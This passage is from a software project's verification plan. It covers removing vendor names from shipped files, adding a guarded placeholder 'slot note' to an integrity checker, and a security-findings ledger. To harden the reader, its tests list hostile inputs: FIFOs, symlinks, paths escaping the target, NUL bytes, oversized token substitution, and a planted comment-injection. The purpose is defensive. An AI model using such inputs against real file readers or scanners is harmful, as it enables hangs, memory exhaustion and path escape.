* **The interpreter-binding code, by name.** The set is `_resolve_interpreter`, `_probe_interpreter`, `encode_display`, `_intent_whoami`, `_surface_intents`, `_prune_intents`, `_run_evolution_infer`, `_do_full_handoff`, `cmd_session_start` and `cmd_session_end` in `templates/skills/_lib/session.py`: the resolver, its probe, the terminal encoder, and every function that obtains or runs the resolved path. Two of the three hit lines are inside docstrings of functions in that set: `:905` in `cmd_session_start` (docstring lines 900-910) and `:1338` in `cmd_session_end` (1334-1346). A docstring is part of `ast.dump`, so the check differs for those two. For the eight others the full `ast.dump` of the function is equal before and after. For `cmd_session_start` and `cmd_session_end` the docstring-stripped dump is equal, and every diff hunk that overlaps the function lies inside its docstring's line span. The script under *Verification* does this; its controls (a reworded docstring reads SAME, a reworded comment or changed code inside either function reads DIFFERENT, a changed `_resolve_interpreter` reads DIFFERENT) are recorded. `:215` is a module comment outside every function. *Red when* any named function differs, or a hunk inside either of the two lies outside its docstring.
* **The routing table.** `json.load` of the new `templates/skills/_data/vendor_targets.yml` equals the parent's after removing `_doc` from each. The new `_doc` names no harness in prose (the lowercase ids in the rows are untouched), keeps every fact the old one states (canonical source, the tier meanings, the `auto_suppress` levels, that a vendor refresh is a row edit), and the reviewer reads it against the old. Nothing reads `_doc`: `load_vendor_targets` in `bootstrap/_scaffold/install.py` and `_load_vendor_targets` in `tools/session.py` read the rows, shown by reading both, and `test_skills_matrix.py` loads the changed file. *Red when* any non-`_doc` key differs or a fact is lost.
* **The skill.** The `SKILL.md` change is the one phrase near line 28 (and its twin); it points at the routing table instead of naming a harness. `git diff` shows no other line, and **the file's line count is unchanged**, so lines 43-45 (the board paragraph `board-as-basis` cites) stay where they are in both copies. The skill-contract tests pass. The commit body records `grep -c cairn:slot` on the two copies (0).
* **Control for the zero.** Before relying on "no hits", the same search finds the known hit at the parent.

### C3 -- The onboarding package

Hits at the base: 27 (`__init__` 2, `activation` 6, `cli` 4, `security` 5, `shared` 2, `triggers` 7 in the six modules; `onboarding_activate.py:53` 1). Frozen: the six templates and `scripts/onboarding_activate.py`. Finalize seven twins.

* **K1** with the 27 lines. **K2** for seven `.py` files. **K3** for seven pairs. **K4** for seven records.
* **Credits become reasons.** Each credit such as "(Codex P2-5 decision: ...)" or "per Antigravity plan-review P3-1" is replaced by the property the code relies on (for example "the log is tracked and parallel to the deliberation tree", "a distinct exit code so automation can tell the case apart"). `activation.py:179` names `modflow_tools/tools/intent.py` as a precedent; it becomes the intent log's precedent without the project name. *Red when* K5 finds a lost explanation.
* **Behaviour pinned by tests that read these modules passes**: the onboarding and active-surfacing tests listed in *Verification*. `test_ast_attest.py` shows only the 2 failures it shows at the base, and they are not in these files.

### C4 -- The content scanner and the intent tool

Hits at the base: 3 (`templates/modules/team-gated/content_scan.py:329` and `:547`, `templates/modules/team-gated/intent.py:64`). Frozen: `templates/modules/team-gated/content_scan.py` and `scripts/content_scan.py`. Finalize `scripts/content_scan.py` and `tools/intent.py`.

* **K1** with the 3 lines. **K2** for two `.py` files. **K3** for two pairs. **K4** for two records.
* **The scanner's look-alike signs survive.** `content_scan.py:329` is a comment between the string pieces of one regular expression, and `_OHM_SIGNS` holds two look-alike characters that an editor's Unicode normalization would merge. K2(a) catches both, because string constants are part of `ast.dump`. As a direct control: after the edit, `len(set(_OHM_SIGNS))` is 2 when the module is loaded, and the diff has no hunk on the `_OHM_SIGNS` lines. *Red when* either differs.
* **The scanner behaves the same.** `test_content_scan.py` passes, and `python scripts/content_scan.py bootstrap/tests/fixtures/redteam/malicious.txt` prints identical output before and after.

### C5 -- The shipped Markdown

Hits at the base: 8 in five templates (`documentation-plan.md` 4, `documentation_plan_template.md` 1, `incident-trackers.md` 1, `incident_log_template.md` 1, `solo-greenfield.md` 1), and, once C1 counts them, 3 more: the `reviewer=` credits. Finalize `dev/modules/incident_log_template.md` only.

* **K1** with 8 lines, then the 3 credits (the gate counts them from C1). **K3** for three pairs. **K4** for one record. **K5.**
* **The three credits** (`api-access-security.md:101`, `web-hosting-security.md:70` and `:93`) become `reviewer="agent"`, the form `templates/core/NOTICE.md` already uses. The scanner does not read the `reviewer=` value, so nothing is suppressed or revealed: `python scripts/content_scan.py` over the two files prints identical findings before and after (control: the same command on a scratch copy with a planted imperative HTML comment prints a flag). *Red when* the findings differ.
* **`modflow_tools` becomes "the reference deployment" or is dropped** in the five hit lines, without changing a sentence's meaning (K5).
* **The solo-greenfield paragraph keeps its count and its line numbers.** `test_onboarding_review_tiers.py::test_solo_greenfield_external_tier_paragraphs_name_their_staffing` passes: it still counts exactly three paragraphs naming "External" and "tier". The reworded line 92 adds no "tier" to its paragraph, and the file's line count is unchanged. The combined plan deletes this test later; this run is its last use. *Red when* the node reports another count or the line count moves.
* **No slot markers.** The commit body records `grep -c cairn:slot` returning 0 on each of the seven Markdown templates (control: `dev/plans/_template.md` returns 3).
* **The twins that stay mismatched stay byte-identical** to their templates (`dev/modules/documentation-plan.md`, `dev/modules/incident-trackers.md`): `cmp` exits 0 and the 18 violations do not grow.

### C6 -- Cairn's own prose

Hits at the base: 20 in four files marked (`docs/agent-team-onboarding.md` 8, `doctrine/lifecycle-contract.md` 5 on two lines, `doctrine/rationale.md` 3 on one line, `bootstrap/tests/fixtures/skills/README.md` 4) and 7 reworded (`bootstrap/tests/fixtures/skills/README.md:35`, six in `docs/DOCUMENTATION_PLAN.md`). Frozen: the fixture README.

* **K1.** After C6 the FAIL lines in these files are zero (the whole gate reads zero at C7, once C2-C5 have also landed). The 20 marked hits move to `info` lines carrying their reasons.
* **Markers add text only.** For the three files marked same-line (`doctrine/lifecycle-contract.md`, `doctrine/rationale.md`, the fixture README's three marked lines), deleting each `<!-- vendor-ok: ... -->` marker and the one space before it from the new file gives back the parent's bytes exactly, and the file's line count is unchanged (no citation into it shifts). For `docs/agent-team-onboarding.md` the fence at lines 37-38 gets two own-line block markers around it, which add two lines; nothing cites that file by line (`grep -rnE 'agent-team-onboarding\.md:[0-9]'` outside the archives prints nothing at the base), and lines 65-67 get three same-line markers. Deleting every marker span or marker line from the new file still gives back the parent's bytes. *Red when* any other text differs, or a line was added to a doctrine file.
* **Markers are tight and declarative.** No marker block spans a line that has no hit, except the fence wrapper (the commit body lists its span). Each reason is one short sentence (under 100 characters), is declarative, and matches none of the imperative verbs in `templates/modules/team-gated/content_scan.py`'s `_IMPERATIVE_IN_COMMENT_RE` (run the regex on each reason; control: a scratch reason built around the verb "ignore" matches). *Red when* a reason matches or is longer.
* **`info=` is recorded.** The commit body records the `info=` figure beside `fail=`; it equals the parent's 21 plus one per marked token occurrence and one per block begin, so a name added later inside a block shows as a changed count.
* **The credit is reworded, not marked.** `bootstrap/tests/fixtures/skills/README.md:35` ("Codex P2#3") keeps its reason (why `declared-flag` is not yet `native-tested`), quoted old beside new in the body (K5).
* **The stale lines are corrected, and true.** The six `docs/DOCUMENTATION_PLAN.md` lines (`:25`, `:28`, `:103`, `:150`, `:414`, `:419` at the base) no longer say Cairn does not host its own `dev/` tree; each new statement is checked by a command (for example `git ls-files dev/proposals/archive | wc -l` shows Cairn's own records), and the file's FAIL lines are zero. `claim_check.py` and `check_cairn.py` are clean on the file; `test_documentation_plan_module.py` and `test_default_security_stance.py` pass. The record for this file stays mismatched (one of the 18) and is not finalized.
* **The rate-limit gate is not engaged**: no sentence in `doctrine/` changes (the first bullet shows it).

### C7 -- Zero, and the log

* **The gate reads zero.** `python scripts/quality_gate.py --sub neutrality` prints `fail=0` and exits 0, the "green" recorded for `quality-gate-neutrality` in `bootstrap/tests/_gate_manifest.py:149-151`. The `info=` figure is recorded. *Red when* any FAIL line remains.
* **The plants.** In a scratch worktree at C7's commit, add each plant alone to a clean copy (the unplanted copy reads 0 first, as the control) and record the gate's result: visible prose in a `templates/` file `fail=1`; a whole-line comment there `fail=1`; a `.txt` file there `fail=1`; a `.json` value there `fail=1`; and the named blind spots, each `fail=0`: lower case `claude`; `ClaudeCode`, `GPT4o`, `Claude_Code`; a zero-width character inside a name. *Red when* a "1" row reads 0 or a blind spot reads above 0 (that would mean the claim in this plan is wrong).
* **The one-time search.** Over every added line of `git diff -U0 b13ad7b7..<tip>`, where `b13ad7b7` is the plan-open commit and `<tip>` is the commit just before C7's own, in every changed file except these: `scripts/quality_gate.py` and `bootstrap/tests/test_quality_gate_neutrality.py` (the checker's own name list and its tests are the one place vendor names are meant to appear); `doctrine/consolidation-review.md` (the log rows quote tokens by design, inside one marker block the gate reads); and deliberation records (`dev/plans/`, `dev/proposals/`, `dev/PLANNING.md`, `CHANGELOG.md`). Search case-insensitively, as a substring, for each of the 20 denylist entries, without using the gate's matcher. For every hit print the containing word and tabulate the distinct words. Read them by hand. Each must be a routing id or a path (`claude-code`, `.claude/skills`, `CLAUDE.md`), a marker reason inside a marker, or an unrelated English word that contains a short name (for example "metadata" for Meta, "decline" for Cline), named as such. A joined, lower-case or odd spelling of a name is a failure. Control: the same search on a scratch line holding `ClaudeCode` shows it. This covers this change's lines only; it is not a standing guarantee. C12 repeats it over `b13ad7b7..<tested commit>`. *Red when* a hit is a name in a form the gate cannot see.
* **The pass is logged.** `doctrine/consolidation-review.md` > "Dogfood disposition log" gains rows inside its existing `vendor-ok` block, before the end marker: the checker widened (what, and the 74 to 81); the shipped leaks reworded (counts per class); the illustrative mentions marked; the stale lines corrected; a row that says **why zero should hold this time**, and a row recording the limits of "zero" and the trigger below. No line is added outside the block, and the gate still reads `fail=0` afterwards. *Red when* the gate reads above 0 after the rows are added.
  * *Why zero should hold:* `29ffeea6` reached `fail=0` on 2026-05-28 and `dbc09557` put the first reviewer credit into `_onboarding/` that afternoon, so the first refill took hours. Two things have changed since: Boundary B runs the gate on every plan (`5f6ecccc`, 2026-08-05), and `013847b6` (2026-08-18) bars crediting reviewers in code.
  * *The limits:* zero is no listed name as a whole word, in its normal capitals, in the file types the gate reads. It does not cover lower-case or joined spellings, hidden characters, names missing from the list, file types not on the list, or deliberate hiding. And outside `templates/`, a line or block that carries a `vendor-ok` marker is exempt by design; those files do not ship, and `info=` is the only sign of a name added under a marker.
* **The standing trigger is written down.** The log row states: a Boundary B record after archive that shows a neutrality failure the change under test did not introduce means the commit hook is owed. The trigger is Boundary B's own second command (`AGENTS.md` > "Verification boundaries"), which a person runs; no hook runs the gate today.
* **The twins and the record, finally (SR14).** All 15 pairs edited so far `cmp` clean (the sixteenth, the doc-drift pair, joins in C11); for each of the 12 finalized records the `hash` equals the SHA-256 of its template at the tip; `python bootstrap/verify_integrity.py --target .` lists exactly the 18 files recorded under *Scope*. *Red when* a pair differs, a hash differs, or the list changes.

### C8 -- The note's frame

Frozen: `bootstrap/verify_integrity.py`, `bootstrap/tests/test_verify_integrity.py`. Every node builds its own lockfile, base cache and files in `tmp_path`, and is red at C8's parent for the reason the commit body names (the note does not exist), checked in a throwaway worktree with only the new tests copied in.

* **Edits only add.** C8's diff to `bootstrap/verify_integrity.py` against C8's parent removes or changes no existing line: `git diff -U0 <parent> -- bootstrap/verify_integrity.py | grep -E '^-[^-]'` prints nothing (control: the same grep on `git diff 7c077ddf^ 7c077ddf` prints the removed hint lines). The record loop gains added lines only: `accepted = []` and `living = []` beside `violations`; an `else:` branch after the hash comparison that appends each non-verbatim record with the bytes already read; `living.append(rec)` before the living-state `continue`; and, before each of the two `return` statements (`return 1` and `return 0`, which stay exactly as they are), a flush and one call to the fenced note. The count of in-scope records that did not pass is derived after the loop from the lockfile's record list, `accepted` and `living`; nothing is incremented inside a failure branch beside `violations.append` and `continue`, the lines that decide the verdict. The same holds cumulatively at C9 (against C8's parent). The frozen test file likewise: its diff against C8's parent removes or changes no line, and the 19 node IDs collected at the base (the existing hint test and linear-scan test among them) are all still collected. *Red when* any existing line of either file changes or any base node goes uncollected.
* **Order and flush.** `verify()` fixes its exit code and prints its report before calling `_slot_note`; the call is the last thing before the return; the two fail-closed early returns never call it. Tests: a spy in place of `_slot_note` records the captured output at call time and finds the report already there; a second test shows the spy is not called on a missing lockfile and on a lockfile with no files. `sys.stdout.flush()` runs just before the call: the OK line goes to stdout, which Python buffers when it is piped, and the note goes to stderr, which it does not. A third test runs the check once through a subprocess with stderr merged into stdout and requires the `verify_integrity: OK` line to precede the first `slot note:` line (captured output in the first test cannot show this). *Red when* the note is called inside the record loop or before the report, or the flush is removed (the merged output then shows the note first).
* **What it receives.** Its parameters are exactly: the target, the accepted non-verbatim records with the bytes the integrity pass already read, the legitimate living-state records, the lockfile's tokens, and an integer count of in-scope records that did not pass. A test reads `inspect.signature(_slot_note)` and finds no parameter named for the violation list, the skipped count, or an exit code. *Red when* a parameter carries any of them.
* **The fence.** An `Exception` or a `SystemExit` raised inside the note prints exactly one line, `slot note: not run (<ExceptionType>)`, naming the type and never the message (messages can carry tree-controlled text), and `verify()` returns the code fixed before the call. `KeyboardInterrupt` is not caught. Tests: spies raising `RuntimeError` with an escape byte in its message, `SystemExit(3)`, and `KeyboardInterrupt` (which propagates). *Red when* the message appears, the code changes, or Ctrl-C is swallowed.
* **The verdict cannot change.** One parametrized test runs `verify()` twice per case, normally and with `_slot_note` replaced by a no-op, and requires equal exit code, equal stdout, and equal stderr once lines beginning `slot note:` are removed. Each case also asserts the hostile value really reaches the note (the record is non-verbatim and accepted, or a legitimate living-state record, and the coverage line counts it under the expected reason), so the comparison is not vacuous at the parent. The 23 inputs of C8 (C9 adds a 24th):
  * `base_cache`: is not a string; names a directory; names a FIFO (under a timeout, so a blocking open fails the test and not the suite); is a symlink; has a symlinked parent; points outside the target; points outside `dev/.cairn/base/`; holds a NUL byte.
  * The base copy: is over the cap; is not UTF-8. `base_hash`: does not match; is not a string.
  * `tokens`: is not a mapping; has a non-string key; has a non-string value.
  * The installed bytes of a file that passes the integrity check: are not UTF-8; are over the cap.
  * **A living-state file** (a legitimate path in `_LIVING_STATE_DSTS`, with a base copy): is a FIFO (under a timeout); is a symlinked leaf; has a symlinked parent directory; is a directory; is over the cap; is not UTF-8. Each is counted "unreadable" in the coverage line.

  *Red when* any case changes the exit code or the report, or is vacuous.
* **Old versus new, the verdict as a whole (one-shot, recorded in the commit body).** The no-op comparison shares the new record loop, so it cannot see an edit to the loop. In a throwaway worktree at the tested commit, put C8's parent `verify_integrity.py` in the same folder as the new one under the name `verify_integrity_parent.py` (same engine, same templates, so only the verifier differs) and run both as `python <file> --target <tree>` on the same trees: the 23 cases above, a fresh `solo-greenfield` install, and Cairn's own tree. Exit code, stdout and stderr (once `slot note:` lines are removed) must be equal for every tree. Build the trees with the test file's module-level builders so they are the suite's own. Repeated at C9 and at C12. *Red when* any tree differs.
* **The record still fails on its own.** A modified file whose record carries an unsafe `base_cache` still exits 1 with its `modified (hash mismatch)` line. *Red when* it exits 0.
* **The reader (SR12).** One `os.open` per file, with its flags built inside the fenced call by `getattr(os, "O_NOFOLLOW", 0)` and likewise `O_NONBLOCK` and `O_NOCTTY`; no module-level statement names an `os.O_*` flag (a `grep` shows it, and a test deletes the three attributes from `os`, imports the module afresh, and gets the same verdict). `os.fstat` on that descriptor must show a regular file. The read asks for the cap plus one byte (the cap is 256 KiB): a file of exactly the cap is accepted if its hash matches, one byte more is refused. The hash, the UTF-8 decode and the slot parse all use that one bytes object; they never re-read the path. The cap also bounds the installed bytes handed in and the living-state files. Containment, for base copies and living-state files alike: `base_cache` (or the living `dst`) is a `str` without NUL, relative, with no `..`, and no component from the target down is a symlink (checked with `os.lstat` per component); base copies must also lie under `dev/.cairn/base/`. *Red when* any of these is absent; the mutation ledger shows each guard is exercised.
* **One reader, for every file the note opens.** No living-state or base-copy file is read by any other route: `grep -n "read_bytes\|read_text\|open(" bootstrap/verify_integrity.py` lists the record loop's existing `read_bytes` and the shared reader's one `os.open`, and nothing else. A living-state read written as `Path(...).read_bytes()` would pass every non-FIFO case and hang the check on a FIFO, after the report and before the code reaches the caller; the FIFO cases and the mutant below are what notice. *Red when* the grep lists another reader.
* **Buckets.** Every in-scope file lands in exactly one bucket: checked, or one of the four not-checked reasons (D5). A tree with one file per bucket prints the expected counts, and they sum to the in-scope total. *Red when* a file can vanish from the count.
* **Living-state files.** A record whose `dst` is in `_LIVING_STATE_DSTS` is read through that reader and counted like any other file. A record flagged `living_state: true` outside that set is a violation in the integrity loop already and is counted "failed the integrity check"; it is never read. *Red when* a living-state file is neither read nor counted.
* **The coverage line is always printed when the note runs.** It gives files in scope, files checked, slots checked, slots listed, empty slots awaiting a module, and the files not checked by reason (slot fields read 0 until C9). On a tree with no base copies it still prints, with every file under "no base copy". All names and paths pass through `ascii()`. *Red when* a tree with nothing checkable prints nothing.
* **Imports and tooling.** The engine imports in `bootstrap/verify_integrity.py` are unchanged (`git diff` of the import block adds only standard-library names); `test_scaffold_substrate.py` passes; the Bandit finding set for the file is the same before and after, or each new finding is dispositioned in the record (`test_security_lint.py`).
* **Mutation ledger** (implementer's, recorded in the commit body, each mutant against an unmutated control run): see *Verification*. All C8 mutants are killed, including "read a living-state file with `Path.read_bytes()`", which the FIFO case must kill, and "drop the flush", which the merged-stream test must kill.

### C9 -- The listing

* **What is listed.** A slot is listed when its body is unchanged from the base copy's, after whitespace is normalized and the recorded tokens are substituted. Tests: an unfilled slot is listed; a filled one is not; a slot carrying `<!-- cairn:customized -->` inside is not; a slot empty in the base copy is counted "empty: filled when its module is installed", not listed, and gets no advice; a base body with `{{project_name}}` matches an installed body holding the recorded value, and an unknown token is left intact on both sides; a slot present only in the base is not listed; unclosed and unpaired markers list nothing. *Red when* any of these flips.
* **Substitution is bounded.** Before any string is built, a slot body's substituted length is computed from its token matches (the body's length plus, for each match with a recorded value, the value's length minus the match's); over the cap, the file is counted "unreadable" and nothing is built. `tokens` values come from the lockfile, which is read uncapped, and a cap-sized base copy can hold tens of thousands of tokens: measured with the engine's own token pattern, a 16 KiB value made 819 MiB in 0.4 s. C9 adds a 24th input to the verdict test: a token with a 20 KiB value used 20 times in one base slot (400 KiB substituted), which must come back "unreadable" without building it, fast. *Red when* the case builds the string or slows the run (mutant: drop the bound).
* **Linear end to end.** Slots are found by one pass over the markers using the bounded name pattern of `_MARKER_RE`, on both the base and the installed text, and slots are paired by that pass's name map: no per-name search over the text (the engine's `_slot_body_in_text` does one search per name, and measured 0.13 s to 1.86 s for 4x the slots, against about 6 ms for one pass). Two tests in the style of `test_unclosed_slots_cost_linear_time`, which uses an absolute bound: (a) a cap-sized text of unclosed openers; (b) a cap-sized text of **closed** slots on both sides, base and installed. Each completes under an absolute bound chosen at about 20 times the measured time of the linear implementation and well under the per-name search's time on the same text (both figures recorded), taking the best of three runs so a loaded full suite cannot trip it. A single ratio of millisecond timings is not used. *Red when* either text costs superlinear time (mutant: pair by per-name search).
* **It agrees with the engine.** A test pins the note's marker pass, customized-marker pattern, token pattern, spacing rule and "empty" rule against `_SLOT_RE`, `_SLOT_END_RE`, `_CUSTOMIZED_MARKER_RE`, `_TOKEN_RE`, `_normalize_for_compare` and `_slot_is_empty` in `bootstrap/_scaffold/slotmerge.py` on a table of samples with case and spacing variants (`<!--cairn:slot X-->`, upper case, CRLF, indentation). Where the engine's own routines disagree with each other (`_slot_body_in_text` accepts only the single-space form), the test names the difference rather than choosing silently. *Red when* the note and the engine decide differently on a listed sample.
* **Printable ASCII.** Every character the note prints is printable ASCII or a newline. A slot name and a path holding an escape byte, a newline, a right-to-left mark and a non-ASCII letter appear only as `ascii()` escapes. The note uses the builtin `ascii()` and not the session kernel's `encode_display`, deliberately: `ascii()` escapes a superset of what `encode_display` escapes (measured over all 1,114,112 code points: it never emits a character outside printable ASCII), it is a builtin and not a second escape table, and importing the session kernel into this trust anchor would add a non-engine import that `test_scaffold_substrate.py` exists to keep out. The cost is that a non-ASCII path prints escaped; Cairn's shipped paths are ASCII. *Red when* any raw control byte appears (mutant: `str()` instead of `ascii()`).
* **No commands.** For a listed slot, a living-state slot, and a file that failed the integrity check, the note's lines contain none of the words `git` and `python` (matched as whole words, since "legitimate" contains "git") and none of the strings `--finalize`, `scaffold.py` and `$(`. *Red when* a command is printed.
* **The warning and the pointer, both cases (D4).** The hash-only warning (this check keeps only a hash, not the text, so it cannot show what changed; read the whole file and confirm your edit is the only change) and the pointer to `bootstrap/UPGRADE.md` > *Recording an edit you made* appear **exactly once** in a run where the note lists a slot or counts a file as failed the integrity check, after the list, and **not at all** in a run where it does neither (a pristine tree prints only the coverage line). Two tests, one per case. *Red when* the warning repeats per entry, or prints on a run with nothing to act on.
* **What the lines say.** A listed slot "still holds the text Cairn shipped", says to write the content or `N/A: <reason>`, and, only for keeping Cairn's text on purpose, to add `<!-- cairn:customized -->` inside the slot (never as the way to fill it). A living-state line says to fill it and mentions no recording step. No line says a slot is required or missing: the note reports placeholder state, not obligation; which slots a profile needs is F8 (`dev/PLANNING.md`) and stays separate. *Red when* a line claims an obligation.
* **A filled slot is never listed.** The "note becomes noise" signal has two halves. The half where the note names slots that are already filled is guarded here by the listing tests above (a filled slot is not listed; a customized slot is not listed) and by the real-tree counts checked against an independent count. The other half, adopters adding the customized marker by reflex, has no mechanism and is a board watch (*Dispositions*).
* **The loop.** (1) A fresh install lists the `AGENTS.md` slot `project-conventions`. (2) It is filled in the file. (3) `verify()` exits 1, the file is counted under "failed the integrity check", and the slot is no longer listed. (4) The test records the file as `bootstrap/UPGRADE.md` will describe it, `main(["upgrade", "--target", ..., "--finalize", "AGENTS.md"])`. (5) `verify()` exits 0 and the slot is not listed. *Red when* step 4 is removed (the exit stays 1): the way back to a passing check is proved, not printed.
* **A first install with a planted line.** The file has a marked slot filled and a line planted outside it, so it fails the integrity check. The note's lines contain no `--finalize`, no `git diff`, no `git status`; the whole output contains no `git diff`; the coverage line counts the file under "failed the integrity check". The existing hint prints `--finalize AGENTS.md` for this same file by design and is not asserted against. *Red when* a command appears on a note line.
* **Verbatim records are not read.** A verbatim record whose file quotes slot markers in code (as `scripts/_onboarding/triggers.py` does) is neither opened nor counted: a spy on the opener sees no call for it. *Red when* it is opened.
* **The known gap is pinned.** `test_a_placeholder_reworded_by_an_upgrade_reads_as_filled`: when the base copy's placeholder text differs from the placeholder still in the installed file, the slot is not listed. Its docstring says this is a recorded limit, not a guarantee, and C10 records it in the upgrade guide.
* **The pointer resolves.** `test_the_pointer_names_a_heading_that_exists` asserts that `bootstrap/UPGRADE.md` has a heading named exactly as the note's pointer. C10 has landed, so it is green from its first commit; it is red if the heading is renamed. *Red when* the heading is renamed.
* **The hint and the guide agree (SR18).** The hint's text is as `7c077ddf` left it; the assertion `history misses uncommitted edits` in `test_a_filled_customized_slot_is_pointed_at_finalize` still passes; `grep -n "its history since install" bootstrap/verify_integrity.py bootstrap/UPGRADE.md` prints nothing (the same grep prints line 186 of `git show 7c077ddf^:bootstrap/verify_integrity.py`; the phrase "or its history" would not do, because the old source splits it across two string literals). *Red when* the phrase returns.
* **Edits only add, cumulatively.** Against C8's parent, `bootstrap/verify_integrity.py` and `bootstrap/tests/test_verify_integrity.py` still have no removed or changed line (the commands of C8), and the old-versus-new comparison is repeated.
* **Two real trees.** (a) A fresh `solo-greenfield` install: the note lists the placeholders in the accepted files plus the living-state ones, and the count is checked against an independent count made by a throwaway script over the lockfile; the pristine tree's verdict is 0. (b) Cairn's own tree: `python bootstrap/verify_integrity.py --target .` exits 1 with the same 18 files as before, the note's coverage line reads 0 slots checked, with the files under "no base copy" apart from the two that have one (measured at the base: 35 non-verbatim records, 2 base copies, 1 matching its `base_hash`), and its figures agree with an independent count. *Red when* a figure disagrees.
* **Mutation ledger.** All C9 mutants are killed (see *Verification*).

### C10 -- The upgrade guide

* **Step 4.** The "The workflow" command block in `bootstrap/UPGRADE.md` gains `python bootstrap/verify_integrity.py --target <repo>` as a fourth step after `--apply`, and a bullet says plainly that only a person following the steps runs it; nothing runs it for them (this is the trigger, named honestly because no CI exists).
* **What the note means.** A bullet says it lists slots still holding Cairn's placeholder, that silence plus the coverage line means none found among what was checked, that it never changes the result `verify()` returns, and that it reports state, not obligation. It names one edge no code can close: the note always writes to stderr, so if stderr is a closed pipe, Python's exit-time flush can make the process exit 120 where a passing run used to write nothing there and exit 0.
* **The known gap.** One sentence: a placeholder that an upgrade rewords reads as filled.
* **The section.** A new `##` heading named exactly `Recording an edit you made`. On whitespace-collapsed text each of these occurs in the section at least once: `the whole file`, `inside your project`, `same-named file`, `your own fill`, `wrong copy`, `keeps only a hash`, `small rewording`, `never proof`, `committed history only`, `uncommitted edits`, `dirty-tree guard`. In prose: read the whole file first, in your project under the `--target` you passed, not the same-named file in the Cairn folder you ran the check from; your own fill must be in what you read, and if it is not you are reading the wrong copy; `verify_integrity` keeps only a hash, so nothing it prints can show what changed; reading finds a line you know is not yours, not a small rewording of Cairn's own text, because the check keeps no copy to compare with; comparing with a copy you trust is an aid, never proof; `git log -p -- <path>` is supplementary and shows committed history only, never uncommitted edits; then record the file with `python bootstrap/scaffold.py upgrade --target <repo> --finalize <path>`, which records the whole file, and whose scoped form skips the dirty-tree guard. The section describes the command and does not claim that any command shows the change. *Red when* a phrase is missing, or the section says a command shows what `--finalize` records.
* **Nothing else moves.** `git diff -U0 bootstrap/UPGRADE.md` shows insertions in "The workflow", the known-gap line and the new section only, plus the code-block edit; `claim_check.py`, `check_cairn.py` and `link_check.py` are clean on the file. C12 reads the finished guide against the finished note (the cold read), because C10 is written before C9.

### C11 -- #16's paragraph

* **One paragraph** (at most 8 lines) in `templates/modules/team-gated/doc-drift-prevention.md`, after "The gate catches drift, not absence" in its "Template content" block (the block the scaffold carries into an adopter's docs guide), and identical in the twin `dev/modules/doc-drift-prevention.md` (`cmp` exits 0; the twin's record stays one of the 18).
* **That paragraph is about the adopter's docs, and only that.** It names the third category: prose that names a symbol the code no longer has. It is present, so not absence, and not generated or synced from anything, so not drift from a source; no gate in this module catches it. It states the discipline: when a symbol is removed or renamed, search the docs, README, changelog and docstrings for the old name in the same change; the deliberation record under `dev/` is history and may keep the name; a changelog may name it to say it was removed. It names no vendor or project and uses a generic example.
* **The two sentences about Cairn sit beside the module's other not-shipped statement.** In the module's "Doctrine + tooling" section, next to "The claim half is *not* shipped here": no tool ships for this category, and the revival rule (promote it to machinery only after three independent recurrences). They are not in the merged block, because they are about Cairn and not about the adopter.
* **No tool, no new file.** `git show --stat` for the commit lists exactly the template and its twin. The commit body records `grep -c cairn:slot` returning 0 on the module.
* **Gates.** `claim_check.py` and `check_cairn.py` clean on both; the neutrality gate still reads `fail=0` where it already does (otherwise: no new FAIL line); `test_doc_drift_tools.py`, `test_doc_governance.py`, `test_practice_modules.py`, `test_profiles_smoke.py` and `test_presets.py` pass.
* **The commit body** says that #16 was already closed on GitHub when this landed, and that the commit changes nothing there.

### C12 -- Boundary B and the record

* **The record is complete.** `## Implementation verification -- <agent> -- <date>` carries every field *Verification* lists, includes the node IDs added to `test_quality_gate_neutrality.py` and `test_verify_integrity.py` as `pytest --collect-only -q` prints them, the `fail=` and `info=` figures, the plant table from C7, the mutation ledger, the old-versus-new comparison, the kernel-function comparison, and the AST comparison. *Red when* a field is absent or an ID differs from the collection.
* **The searches are repeated.** The one-time search of C7 over `b13ad7b7..<tested commit>`; the old-versus-new comparison of C8 on the tested commit; the guide read cold against the finished note.
* **The not-touched list is shown.** `git diff --stat <base>..<tip> -- bootstrap/_scaffold bootstrap/scaffold.py` is empty, and the other "Not touched" paths show no change.
* **Status moves** to `awaiting-code-review` in that commit.

### The security findings ledger

Every finding the accepted text took on, with where it is closed or why nothing is owed. Nothing is dropped. (The plan-review findings that tightened these rows are answered in *Response to plan review*.)

| Finding | What the accepted text requires | Where it is checked |
|---|---|---|
| NU1 | the precedent (zero was reached in May and refilled within hours) and why zero should hold now; a concrete trigger | the C7 log row (the precedent, the two changes since, the trigger) and the CHANGELOG entry at archive |
| NU2 | a way back to a passing check after filling a slot | superseded by the no-commands revision; the way back is proved by the C9 loop and documented by C10 |
| NU3 | a coverage line, always printed; the reworded-placeholder gap tested or recorded | C8, C9, C10 |
| NU4 | question 1 split: the check closed as won't-build, the sentence half given its own disposition | C11; the won't-build half is a *Dispositions* line; the issue's state is in *Found while planning* |
| NU5 | the `:446` comment corrected; the twins named | C1; *Scope* |
| SR1 | the stricter checker; the three credits; the one-time search; the plant table; the blind spots named | C1, C5, C7 and the security preflight below |
| SR2 | claims corrected; no remedy for a failing file; the base copy hashed first | C8 (hash gate), C9 (no remedy, no commands); the corrected claims are in the proposal's ledger |
| SR3 | the note is a separate pass after the verdict; every malformed value leaves the verdict alone | C8: the added-lines-only loop, the no-op comparison and the old-versus-new comparison |
| SR4 | `base_hash`, containment under `dev/.cairn/base/`, a size cap, escaped names | C8, C9 (`shlex.quote` was withdrawn with the commands) |
| SR5 | the marker only to keep Cairn's text; empty slots not listed | C9 |
| SR6 | no `nosec`, `noqa`, `pragma`, `type:` or encoding line added or removed | K2(b) |
| SR7 | the fixture credit and the stale lines reworded; markers tight and declarative; `info=` recorded | C6 |
| SR8 | the review command | withdrawn by the proposal; no command is printed (C9) |
| SR9 | living-state files read and counted | C8 (the reader, the six living-state hostile inputs, the FIFO mutant), C9 |
| SR10 | "zero" says whole word and file types; joined spellings named; the substring search; five comment sites; scanning every file declined | C1, C7, the preflight; the decline is kept (the gate walks the filesystem and `templates/` holds untracked `.pyc` files) |
| SR11 | the dropped fallback recorded; the failing-file line points to the guide | C9 (D4, D6), C10 |
| SR12 | the seven build details | C8 (receives, reader, fence, per-record errors, no-op cases), C9 (printable names, bounded substitution, linear end to end) |
| SR13 | the superset check; a directive carrying a name fails twice | C1 |
| SR14 | the 12 and the 4; hashes equal the templates'; the 18 unchanged | K4, C7 |
| SR15 | no printed command | C9 |
| SR16 | the planted-line test scoped to the note's lines; the guide leads with reading the whole file | C9, C10 |
